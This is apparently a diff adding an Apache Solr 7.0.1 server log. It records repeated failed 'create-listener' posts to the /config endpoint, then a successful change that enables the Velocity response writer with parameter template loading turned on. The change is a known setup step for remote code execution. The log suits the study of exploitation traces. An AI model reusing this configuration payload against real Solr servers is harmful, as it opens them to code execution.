+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:18:45.297 INFO  (qtp12209492-37) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/config params={} status=500 QTime=296
+2020-03-26 03:18:45.299 ERROR (qtp12209492-37) [   x:te1] o.a.s.s.HttpSolrCall null:org.noggit.JSONParser$ParseException: Expected ',' or '}': char={,position=78 AFTER=' Content-Type:application/json Content-Length:313 {' BEFORE=' "create-listener": { '
+	at org.noggit.JSONParser.err(JSONParser.java:419)
+	at org.noggit.JSONParser.nextEvent(JSONParser.java:1074)
+	at org.apache.solr.common.util.CommandOperation.parse(CommandOperation.java:280)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:347)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:324)
+	at org.apache.solr.handler.SolrConfigHandler$Command.handlePOST(SolrConfigHandler.java:334)
+	at org.apache.solr.handler.SolrConfigHandler$Command.access$100(SolrConfigHandler.java:159)
+	at org.apache.solr.handler.SolrConfigHandler.handleRequestBody(SolrConfigHandler.java:137)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:18:50.633 ERROR (qtp12209492-20) [   x:te1] o.a.s.h.RequestHandlerBase org.noggit.JSONParser$ParseException: Expected ',' or '}': char={,position=78 AFTER=' Content-Type:application/json Content-Length:313 {' BEFORE=' "create-listener": { '
+	at org.noggit.JSONParser.err(JSONParser.java:419)
+	at org.noggit.JSONParser.nextEvent(JSONParser.java:1074)
+	at org.apache.solr.common.util.CommandOperation.parse(CommandOperation.java:280)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:347)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:324)
+	at org.apache.solr.handler.SolrConfigHandler$Command.handlePOST(SolrConfigHandler.java:334)
+	at org.apache.solr.handler.SolrConfigHandler$Command.access$100(SolrConfigHandler.java:159)
+	at org.apache.solr.handler.SolrConfigHandler.handleRequestBody(SolrConfigHandler.java:137)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:18:50.633 INFO  (qtp12209492-20) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/config params={} status=500 QTime=4
+2020-03-26 03:18:50.634 ERROR (qtp12209492-20) [   x:te1] o.a.s.s.HttpSolrCall null:org.noggit.JSONParser$ParseException: Expected ',' or '}': char={,position=78 AFTER=' Content-Type:application/json Content-Length:313 {' BEFORE=' "create-listener": { '
+	at org.noggit.JSONParser.err(JSONParser.java:419)
+	at org.noggit.JSONParser.nextEvent(JSONParser.java:1074)
+	at org.apache.solr.common.util.CommandOperation.parse(CommandOperation.java:280)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:347)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:324)
+	at org.apache.solr.handler.SolrConfigHandler$Command.handlePOST(SolrConfigHandler.java:334)
+	at org.apache.solr.handler.SolrConfigHandler$Command.access$100(SolrConfigHandler.java:159)
+	at org.apache.solr.handler.SolrConfigHandler.handleRequestBody(SolrConfigHandler.java:137)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:19:15.647 ERROR (qtp12209492-37) [   x:te1] o.a.s.h.RequestHandlerBase org.noggit.JSONParser$ParseException: Expected ',' or '}': char={,position=80 AFTER=' Content-Type:application/json Content-Length:313 {' BEFORE=' "create-listener": { '
+	at org.noggit.JSONParser.err(JSONParser.java:419)
+	at org.noggit.JSONParser.nextEvent(JSONParser.java:1074)
+	at org.apache.solr.common.util.CommandOperation.parse(CommandOperation.java:280)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:347)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:324)
+	at org.apache.solr.handler.SolrConfigHandler$Command.handlePOST(SolrConfigHandler.java:334)
+	at org.apache.solr.handler.SolrConfigHandler$Command.access$100(SolrConfigHandler.java:159)
+	at org.apache.solr.handler.SolrConfigHandler.handleRequestBody(SolrConfigHandler.java:137)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:19:15.647 INFO  (qtp12209492-37) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/config params={} status=500 QTime=2
+2020-03-26 03:19:15.649 ERROR (qtp12209492-37) [   x:te1] o.a.s.s.HttpSolrCall null:org.noggit.JSONParser$ParseException: Expected ',' or '}': char={,position=80 AFTER=' Content-Type:application/json Content-Length:313 {' BEFORE=' "create-listener": { '
+	at org.noggit.JSONParser.err(JSONParser.java:419)
+	at org.noggit.JSONParser.nextEvent(JSONParser.java:1074)
+	at org.apache.solr.common.util.CommandOperation.parse(CommandOperation.java:280)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:347)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:324)
+	at org.apache.solr.handler.SolrConfigHandler$Command.handlePOST(SolrConfigHandler.java:334)
+	at org.apache.solr.handler.SolrConfigHandler$Command.access$100(SolrConfigHandler.java:159)
+	at org.apache.solr.handler.SolrConfigHandler.handleRequestBody(SolrConfigHandler.java:137)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:23:01.615 INFO  (qtp12209492-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585192434043} status=0 QTime=208
+2020-03-26 03:23:04.443 INFO  (qtp12209492-38) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585192434039} status=0 QTime=1
+2020-03-26 03:23:12.460 INFO  (qtp12209492-13) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={wt=json&_=1585192434039} status=0 QTime=89
+2020-03-26 03:23:14.144 INFO  (qtp12209492-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585192434039} status=0 QTime=0
+2020-03-26 03:23:16.049 INFO  (qtp12209492-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585192434039} status=0 QTime=1
+2020-03-26 03:23:16.175 INFO  (qtp12209492-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={wt=json&_=1585192434039} status=0 QTime=48
+2020-03-26 03:23:16.202 INFO  (qtp12209492-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={wt=json&_=1585192434039} status=0 QTime=121
+2020-03-26 03:23:18.379 INFO  (qtp12209492-38) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585192434039} status=0 QTime=0
+2020-03-26 03:23:18.502 INFO  (qtp12209492-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={wt=json&_=1585192434039} status=0 QTime=34
+2020-03-26 03:23:19.160 INFO  (qtp12209492-37) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585192434043} status=0 QTime=834
+2020-03-26 03:23:22.534 INFO  (qtp12209492-13) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585192434043} status=0 QTime=100
+2020-03-26 03:23:38.427 INFO  (qtp12209492-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={wt=json&_=1585192434039} status=0 QTime=4
+2020-03-26 03:26:57.335 INFO  (qtp12209492-37) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/config params={} status=0 QTime=144
+2020-03-26 03:27:38.262 INFO  (qtp12209492-19) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/config params={} status=0 QTime=4
+2020-03-26 03:28:37.204 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrResourceLoader Written confile configoverlay.json
+2020-03-26 03:28:37.757 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrResourceLoader [te1] Added 51 libs to classloader, from paths: [/usr/local/solr-7.0.1/contrib/clustering/lib, /usr/local/solr-7.0.1/contrib/extraction/lib, /usr/local/solr-7.0.1/contrib/langid/lib, /usr/local/solr-7.0.1/contrib/velocity/lib, /usr/local/solr-7.0.1/dist]
+2020-03-26 03:28:39.400 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrConfig Using Lucene MatchVersion: 7.0.1
+2020-03-26 03:28:39.670 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.IndexSchema [te1] Schema name=default-config
+2020-03-26 03:28:41.409 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.IndexSchema Loaded schema default-config/1.6 with uniqueid field id
+2020-03-26 03:28:41.555 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.CoreContainer Reloading SolrCore 'te1' using configuration from instancedir /usr/local/solr-7.0.1/server/solr/te1
+2020-03-26 03:28:41.576 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrCore [[te1] ] Opening new SolrCore at [/usr/local/solr-7.0.1/server/solr/te1], dataDir=[/usr/local/solr-7.0.1/server/solr/te1/data/]
+2020-03-26 03:28:41.587 INFO  (qtp12209492-13) [   x:te1] o.a.s.r.XSLTResponseWriter xsltCacheLifetimeSeconds=5
+2020-03-26 03:28:41.976 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.CommitTracker Hard AutoCommit: if uncommited for 15000ms; 
+2020-03-26 03:28:41.976 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.CommitTracker Soft AutoCommit: disabled
+2020-03-26 03:28:42.149 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.SolrIndexSearcher Opening [Searcher@68d74b33[te1] main]
+2020-03-26 03:28:42.156 INFO  (qtp12209492-13) [   x:te1] o.a.s.r.ManagedResourceStorage File-based storage initialized to use dir: /usr/local/solr-7.0.1/server/solr/te1/conf
+2020-03-26 03:28:42.209 INFO  (qtp12209492-13) [   x:te1] o.a.s.h.c.SpellCheckComponent Initializing spell checkers
+2020-03-26 03:28:42.211 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.DirectSolrSpellChecker init: {name=default,field=_text_,classname=solr.DirectSolrSpellChecker,distanceMeasure=internal,accuracy=0.5,maxEdits=2,minPrefix=1,maxInspections=5,minQueryLength=4,maxQueryFrequency=0.01}
+2020-03-26 03:28:42.217 INFO  (qtp12209492-13) [   x:te1] o.a.s.h.ReplicationHandler Commits will be reserved for  10000
+2020-03-26 03:28:42.234 INFO  (searcherExecutor-17-thread-1-processing-x:te1) [   x:te1] o.a.s.c.QuerySenderListener QuerySenderListener sending requests to Searcher@68d74b33[te1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
+2020-03-26 03:28:42.234 INFO  (searcherExecutor-17-thread-1-processing-x:te1) [   x:te1] o.a.s.c.QuerySenderListener QuerySenderListener done.
+2020-03-26 03:28:42.234 INFO  (searcherExecutor-17-thread-1-processing-x:te1) [   x:te1] o.a.s.h.c.SpellCheckComponent Loading spell index for spellchecker: default
+2020-03-26 03:28:42.238 INFO  (searcherExecutor-17-thread-1-processing-x:te1) [   x:te1] o.a.s.c.SolrCore [te1] Registered new searcher Searcher@68d74b33[te1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
+2020-03-26 03:28:42.251 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.UpdateLog Could not find max version in index or recent updates, using new clock 1662195673072664576
+2020-03-26 03:28:42.318 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.DefaultSolrCoreState New IndexWriter is ready to be used.
+2020-03-26 03:28:42.319 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.SolrIndexSearcher Opening [Searcher@37142196[te1] main]
+2020-03-26 03:28:42.322 INFO  (qtp12209492-13) [   x:te1] o.a.s.h.SolrConfigHandler Executed config commands successfully and persited to File System [{"update-queryresponsewriter":{
+    "startup":"lazy",
+    "name":"velocity",
+    "class":"solr.VelocityResponseWriter",
+    "template.base.dir":"",
+    "solr.resource.loader.enabled":"true",
+    "params.resource.loader.enabled":"true"}}]
+2020-03-26 03:28:42.323 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/config params={} status=0 QTime=5783
+2020-03-26 03:28:42.323 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrCore [te1]  CLOSING SolrCore org.apache.solr.core.SolrCore@b88f4e9
+2020-03-26 03:28:42.324 INFO  (qtp12209492-13) [   x:te1] o.a.s.m.SolrMetricManager Closing metric reporters for registry=solr.core.te1, tag=193524969
+2020-03-26 03:28:42.387 INFO  (searcherExecutor-17-thread-1-processing-x:te1) [   x:te1] o.a.s.c.QuerySenderListener QuerySenderListener sending requests to Searcher@37142196[te1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
+2020-03-26 03:28:42.387 INFO  (searcherExecutor-17-thread-1-processing-x:te1) [   x:te1] o.a.s.c.QuerySenderListener QuerySenderListener done.
+2020-03-26 03:28:42.389 INFO  (searcherExecutor-17-thread-1-processing-x:te1) [   x:te1] o.a.s.c.SolrCore [te1] Registered new searcher Searcher@37142196[te1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
